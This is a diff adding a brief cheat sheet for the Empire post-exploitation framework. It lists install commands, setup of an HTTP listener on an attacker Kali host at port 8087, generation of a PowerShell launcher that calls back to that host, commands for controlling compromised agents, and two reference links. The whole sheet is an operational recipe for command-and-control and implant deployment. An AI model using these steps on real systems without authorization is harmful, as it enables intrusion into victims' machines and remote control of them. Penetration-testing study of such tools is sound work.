@@ -1,0 +1,25 @@
+Empire::
+
+Initial setup:::::
+
+git clone https://github.com/EmpireProject/Empire.git
+sudo bash ./Empire/setup/install.sh
+./empire
+apt-get install python-flask
+apt-get install python-netifaces
+
+uselistener http
+set Host http://<kaliip>:8087
+set BindIP <kaliip>
+set Port 8087
+execute
+launcher powershell
+
+Once You Have Agents::
+interact <agent>
+usemodule <tabover>
+
+Resources::
+https://bneg.io/2017/07/26/empire-without-powershell-exe/
+https://h4ck.co/wp-content/uploads/2017/11/Empire.pdf
+
